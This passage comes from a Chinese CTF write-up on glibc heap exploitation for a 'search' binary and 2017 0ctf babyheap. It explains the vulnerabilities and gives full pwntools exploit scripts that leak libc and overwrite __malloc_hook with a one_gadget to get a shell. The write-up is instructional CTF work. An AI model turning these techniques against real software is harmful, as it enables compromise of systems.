class="string">&#x27;b&#x27;</span>))</span><br></pre></td></tr></table></figure><p>篡改链表之后，通过偏移找到  size 在 fastbin 范围的 fakechunk 。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./search&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./search&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">word</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;3: Quit\n&#x27;</span>,timeout=<span class="number">3</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter the word size:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(word)))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter the word:\n&#x27;</span>)</span><br><span class="line">p.send(word)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Index</span>(<span class="params">word</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;3: Quit\n&#x27;</span>,timeout=<span class="number">3</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter the sentence size:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(word)))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter the sentence:\n&#x27;</span>)</span><br><span class="line">p.send(word)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">Index(<span class="string">&#x27; m &#x27;</span>.rjust(<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">search(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">search(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Found 136: &#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;unsortbin_addr:&quot;</span> + <span class="built_in">hex</span>(unsortbin_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = unsortbin_addr - <span class="number">0x3c4b78</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">log.info(<span class="string">&quot;str_binsh:&quot;</span>+<span class="built_in">hex</span>(str_binsh))</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Index(<span class="string">&#x27; s &#x27;</span>.rjust(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">Index(<span class="string">&#x27; k &#x27;</span>.rjust(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">Index(<span class="string">&#x27; y &#x27;</span>.rjust(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line">search(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">search(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">search(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">search(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Found&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fakechunk_addr = malloc_hook - <span class="number">0x23</span></span><br><span class="line">Index(p64(fakechunk_addr).ljust(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">Index(<span class="string">&#x27; s &#x27;</span>.rjust(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">Index(<span class="string">&#x27; k &#x27;</span>.rjust(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">Index(p64(<span class="number">0xf1207</span>+libc_base).rjust(<span class="number">0x1b</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><h3 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h3><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>保护全开，RELRO 全开，got 表不能修改。</p><h3 id="基本功能-2"><a href="#基本功能-2" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序是一个堆管理器，有增删查改功能。</p><p>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> inuse;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">void</span> *chunk_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制申请 chunk 上限为 16 个，大小小于等于 4096 字节即可。四大功能都是根据 chunk 下标进行操作。</p><h3 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h3><p>在修改函数中，修改的大小是自行输入的，并不是读取结构体中 chunk size ，造成了堆溢出问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">my_write</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 index; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  index = get_num();</span><br><span class="line">  i = index;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)index &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)index &lt;= <span class="number">15</span> )<span class="comment">// 检查下标范围</span></span><br><span class="line">  &#123;</span><br><span class="line">    index = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)index + a1);<span class="comment">// 提取chunk指针</span></span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)index == <span class="number">1</span> )                   <span class="comment">// 检查inuse位</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      index = get_num();</span><br><span class="line">      size = index;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)index &gt; <span class="number">0</span> )              <span class="comment">// 检查size大于0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        index = write_chunk(*(_QWORD *)(<span class="number">24LL</span> * i + a1 + <span class="number">16</span>), size);<span class="comment">// 堆溢出，没有对size进行检查</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>利用堆溢出，造成堆重叠（通过 extend 向前合并），泄露出 libc 地址。再次利用堆溢出，造成 fastbin attack（Arbitray Alloc），修改 __malloc_hook 为 onegadget 。</p><p>创建非 fastbin 的 chunk0、2 触发 unlink 合并为一个整体；被重叠 chunk1 用于读取 libc 地址；保护避免与 topchunk 合并的 chunk3 。</p><p>释放 chunk0 ，修改 chunk1 溢出覆盖 chunk2 的 prev_size 和 size_inuse ，释放 chunk2 触发 unlink 合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">write(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>)</span><br><span class="line">dump(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br></pre></td></tr></table></figure><p>申请 0x60 fastbin chunk 之后就是常规的修改 fastbin fd 指针达到任意写的操作。这里偏移构造 size 位我选择 0x23 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x70</span>)<span class="comment">#4</span></span><br><span class="line">create(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0xa0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(malloc_hook-<span class="number">0x23</span>)</span><br><span class="line"><span class="comment"># write(3,len(payload),payload)</span></span><br><span class="line">write(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">create(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">create(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x23</span>-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line">write(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><h4 id="伪造-unsortedbin-为-fastbin"><a href="#伪造-unsortedbin-为-fastbin" class="headerlink" title="伪造 unsortedbin 为 fastbin"></a>伪造 unsortedbin 为 fastbin</h4><p>这是另外一个思路泄露出 libc 地址，前面是用 unlink 机制实现的一个堆重叠。这里用 wiki 的方法，通过修改 fastbin fd 指针，配合修改 chunk header 信息，将一个 inuse 的 unsorted bin 放入到 fastbin ，重新申请出来，实现两个指针指向一个地址。</p><p>布置好堆情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x10</span>)<span class="comment">#溢出修改下一个chunk header</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#fastbin</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#fastbin</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#溢出修改下一个chunk header</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#被放入fastbin的chunk</span></span><br><span class="line">create(<span class="number">0x100</span>)<span class="comment">#防止unsortedbin与topchunk合并</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#布置fastbin</span></span><br><span class="line"><span class="comment">#chunk1-&gt;chunk2-&gt;0</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后修改 fastbin fd 指针指向 unsorted bin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fastbin:chunk1-&gt;chunk4-&gt;0</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x80&#x27;</span></span><br><span class="line">write(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>然后将 unsorted bin 的 chunk size 修改为所在的 fastbin 大小，从而绕过 fastbin 申请时的检查：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">write(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>fastbin 申请检查源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请两次 fastbin ，将 unsorted bin 申请出来。然后需要将 unsorted bin 的 chunk_size 修改为正确大小，才能成功释放：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修复chunk_size </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">write(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ex</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">write(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>)</span><br><span class="line">dump(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">onegadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x70</span>)<span class="comment">#4</span></span><br><span class="line">create(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0xa0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(malloc_hook-<span class="number">0x23</span>)</span><br><span class="line"><span class="comment"># write(3,len(payload),payload)</span></span><br><span class="line">write(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">create(<span class="number">0x60</span>)<span 